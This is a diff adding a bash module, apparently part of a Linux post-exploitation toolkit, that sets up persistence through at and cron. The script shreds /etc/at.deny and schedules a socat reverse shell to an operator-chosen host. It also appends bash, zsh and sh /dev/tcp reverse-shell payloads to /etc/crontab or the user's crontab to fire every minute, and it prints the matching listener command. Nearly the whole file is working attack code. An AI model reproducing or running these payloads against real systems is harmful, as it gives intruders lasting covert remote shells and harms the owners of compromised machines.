@@ -1,0 +1,184 @@
+#!/usr/bin/env bash
+
+# --- all vars are exported in main script line:71 --- 
+# shellcheck disable=SC2154
+
+# --- Scheduler Persistance ---
+echo -e "${RED}$(line)${EOC}"
+echo -e "${RED}[1]${EOC} - At"
+echo -e "$(line)"
+echo -e "${RED}[2]${EOC} - Crontab"
+echo -e "${RED}$(line)${EOC}\n"
+
+read -rp "[?] Which command to use > " scheduler_choice
+case $scheduler_choice in
+1) # --- At Persistence func (i know this is useless shit-func, contribute if u have any idea)---
+    if [ "$(command -v at)" ]; then
+        echo -e "\n${RED}[+]${EOC} Command \"at\" exists on system\n"
+        if [[ -r "/etc/at.deny" && -s "/etc/at.deny" ]]; then
+            echo -e " Here are denied users of using \"at\" command" && tabulate -f simple </etc/at.deny
+            read -rp "[?] Do u want to delete all users (y\n) > " at_user_choice
+            if [[ "$at_user_choice" =~ ^[Yy]|[Yy][Ee][Ss]$ ]]; then
+                if [ "$(command -v shred)" ]; then
+                    shred -n 5 -zfuv /etc/at.deny && touch /etc/at.deny && echo -e "\n \"/etc/at.deny\" file deleted via \"shred\" command and a new empty one has been created "
+                else 
+                    rm -f /etc/at.deny && touch /etc/at.deny && echo " \"/etc/at.deny\" file deleted via \"rm\" command and created a new empty one "
+                fi;
+            else
+                echo "${RED}[x]${EOC} Rolling back to menu" && menu
+            fi;
+        else
+            echo "${RED}[x]${EOC} At's denied users file is not found or not readable for current user - ($USER)"
+        fi;
+        read -rp $'\033[0;91m[*]\e[0m Enter IP or domain for basic TCP user custom > ' at_ip
+        if [[ -z "$at_ip" ]]; then 
+            echo "${RED}[x]${EOC} IP or domain cannot be empty."
+            scheduler_persistence
+        else 
+            if [[ "$at_ip" =~ [a-zA-Z] ]]; then
+                domain_to_ip=$(dig +short "$at_ip" | head -n 1)    
+                if [[ -n "$domain_to_ip" ]]; then
+                at_ip="$domain_to_ip"
+                echo " Resolved domain to IP > $at_ip"
+            else
+                echo "${RED}[x]${EOC} Unable to resolve the domain to IP. Please enter a valid IP or make sure the domain is resolvable."
+                scheduler_persistence
+        fi;fi;fi;
+        read -rp $'\033[0;91m[*]\e[0m Eneter port > ' at_port
+        if [[ "$at_port" =~ [0-65535] && $(command -v socat) ]]; then
+            at_payload="socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$at_ip:$at_port"
+            echo "$at_payload" | at now + 5 minute && echo -e "\n \"$at_payload\" every 5 minute socat payload will be executed."
+            echo -e "${RED}[*]${EOC} Paste this socat listner \"socat file:$(tty),raw,echo=0 TCP-L:$at_port\" command in your machine" 
+            scheduler_persistence
+        else
+            echo "${RED}[x]${EOC} \"socat\" command not found or u entered invalid port [0-65535]. "
+            scheduler_persistence
+        fi;
+    elif [ "$priv_status" == "is_su" ]; then
+        read -rp "[?] Do u want to install \"At\" command (y\n) > " at_choice
+        if [[ "$at_choice" =~ ^[Yy]|[Yy][Ee][Ss]$ ]]; then
+            sudo apt update -y && sudo apt install at && sudo systemctl enable --now atd && echo -e " \"At\" command successuly installed and \"atd\" daemon enabled.\n"
+            scheduler_persistence
+        elif [[ "$at_choice" =~ ^[Nn]|[Nn][Oo]$ ]]; then
+            echo "${RED}[x]${EOC} Going back to main menu "
+            scheduler_persistence
+        fi
+    else
+        clear
+        echo -e "${RED}[x]${EOC} \"at\" command is not install on your system "
+        echo -e "${RED}[x]${EOC} U cannot install \"at\" command without SU priveleges\n " 
+        scheduler_persistence 
+    fi;;
+2) # --- Crontab Persistence func ---
+    cron_example="
+    [*] Example of job definition:
+        .---------------- minute (0 - 59)
+        |  .------------- hour (0 - 23)
+        |  |  .---------- day of month (1 - 31)
+        |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+        |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+        |  |  |  |  |
+    ${RED}    *  *  *  *  * user-name   command to be executed${EOC} 
+    ${BOLD}    5  *  *  *  *   root      /bin/nc 127.0.0.1 4444${EOC}     
+    " 
+
+    # --- Checking premissions of crontab stuff (files & dirs) ---
+    cron_stuff=("/etc/crontab" "/var/spool/cron/crontabs/$USER/");
+
+    for cron_stuff_check in "${cron_stuff[@]}"; do
+        sleep 0.3
+        if [ -w "$cron_stuff_check" ]; then
+            echo -e "${RED}[+]${EOC} Crontab file or directory - \"$cron_stuff_check\" is writeable"
+        elif [ -f "$cron_stuff_check" ]; then   
+            echo -e "${RED}[x]${EOC} Crontab file or directory - \"$cron_stuff_check\" is not writeable for current logged user ${RED}($USER)${EOC}."
+        elif [ -d "$cron_stuff_check" ]; then
+                continue
+        else
+            echo -e "${RED}[x]${EOC} Crontab file or directory - ${RED}$cron_stuff_check${EOC} not found or ${RED}permission denied${EOC} for current user ${RED}($USER)${EOC} \n\t"    
+            mkdir -p "$cron_stuff_check" && echo -e "${RED}$cron_stuff_check${EOC} has been successufly created "
+        fi;
+    done
+
+    echo
+
+    # --- Custom crontab command ---
+    read -rp "[?] Do u want to add custom command to crontab (y\n) > " cron_choice
+    if [[ "$cron_choice" =~ ^[Yy]|[Yy][Ee][Ss]$ ]]; then
+        echo -e "${RED}$cron_example${EOC}" && echo
+        read -rp $'\033[0;91m[*]\e[0m Enter your custom command > ' cron_command
+        # --- Custom cron command based on priv ---
+        if [[ "$priv_status" == "is_su" && -n "$cron_command" ]]; then
+            echo "$cron_command" | tee -a "${cron_stuff[0]}" && echo " $cron_command successfully added to $USER's ${cron_stuff[0]}"
+        elif [[ "$priv_status" == "not_su" && -n "$cron_command" ]]; then
+            echo "$cron_command" | crontab - && echo " $cron_command successfully added to $USER's crontab"
+        else
+            echo "${RED}[x]${EOC} Something went wrong while checking permissions or input is empty"
+            scheduler_persistence   
+        fi;
+        # --- Default user custom payload based on user's interpretator --- 
+    elif [[ "$cron_choice" =~ ^[Nn]|[Nn][Oo]$ ]]; then
+        # --- Validation of input ---
+        read -rp $'\033[0;91m[*]\e[0m Enter IP or domain for basic TCP > ' cron_ip
+        if [[ -z "$cron_ip" ]]; then 
+            echo "${RED}[x]${EOC} IP or domain cannot be empty."
+            scheduler_persistence
+        else 
+            if [[ "$cron_ip" =~ [a-zA-Z] ]]; then
+                domain_to_ip=$(dig +short "$cron_ip" | head -n 1)    
+                if [[ -n "$domain_to_ip" ]]; then
+                cron_ip="$domain_to_ip"
+                echo " Resolved domain to IP: $cron_ip"
+            else
+                echo "${RED}[x]${EOC} Unable to resolve the domain to IP. Please enter a valid IP or make sure the domain is resolvable."; 
+                scheduler_persistence
+        fi; fi; fi;
+
+        read -rp $'\033[0;91m[*]\e[0m Enter PORT > ' cron_port
+        if [ "$current_shell" == "/bin/bash" ] || [ "$current_shell" == "/usr/bin/bash" ]; then 
+            # --- Bash rev shell payload ---
+                cron_payload="* * * * * $USER bash -c '0<&33-;exec 33<>/dev/tcp/$cron_ip/$cron_port;sh <&33 >&33 2>&33'"
+                if [[ "$priv_status" == "is_su" ]]; then
+                    echo "$cron_payload" | tee -a "${cron_stuff[0]}" && echo -e " Payload successufly added to \"${cron_stuff[0]}\""
+                    scheduler_persistence   
+                else
+                    echo "$cron_payload" | crontab - && echo -e " Payload successfully added to $USER's crontab"
+                    scheduler_persistence
+                fi;
+            # --- Zsh rev shell payload ---
+            elif [ "$current_shell" == "/bin/zsh" ] || [ "$current_shell" == "/usr/bin/zsh" ]; then 
+                cron_payload="* * * * * $USER zsh -c 'zmodload zsh/net/tcp && ztcp $cron_ip $cron_port && zsh >&\$REPLY' 2>&\$REPLY' 0>&\$REPLY' > /dev/null &"
+                if [[ "$priv_status" == "is_su" ]]; then
+                    echo "$cron_payload" | tee -a "${cron_stuff[0]}" && echo -e " Payload successufly added to \"${cron_stuff[0]}\""   
+                    scheduler_persistence
+                else
+                    echo "$cron_payload" | crontab - && echo -e " Payload successfully added to $USER's crontab"
+                    scheduler_persistence
+                fi;
+            # --- Sh rev shell payload ---
+            elif [ "$current_shell" == "/bin/sh" ] || [ "$current_shell" == "/usr/bin/sh" ] ; then 
+                cron_payload="* * * * * $USER 0<&196;exec 196<>/dev/tcp/$cron_ip/$cron_port; sh <&196 >&196 2>&196"
+                if [[ "$priv_status" == "is_su" ]]; then
+                    echo "$cron_payload" | tee -a "${cron_stuff[0]}" && echo -e " Payload successufly added to \"${cron_stuff[0]}\""   
+                    scheduler_persistence
+                else
+                    echo "$cron_payload" | crontab - && echo -e " Payload successfully added to $USER's crontab"
+                    scheduler_persistence
+                fi;
+        else
+            # --- Giving link of cheatsheet if user's interpertator is unknown --- 
+            echo -e "${RED}[x]${EOC} Reverse-shell command for $USER's default shell(\"$current_shell\") is unknown. Supported shells are - sh, bash & zsh. \n"
+            echo -e "${RED}[!]${EOC} Take a look at this cheet-sheet & manually add it to crontab based on your shell - (\"$current_shell\") \n" 
+            echo -e "${RED}[*]${EOC} https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/ \n"
+            scheduler_persistence
+        fi;
+    else
+        echo -e "${RED}[x]${EOC} No option has been seleted going back to menu" && sleep 0.5
+        scheduler_persistence
+    fi;;
+0)
+    echo -e "${RED}[+]${EOC} Going back to main menu"
+    exit 0;;
+*) 
+    echo -e "${RED}[x]${EOC} Enter valid option [0-2]\n"
+    scheduler_persistence;;
+esac;
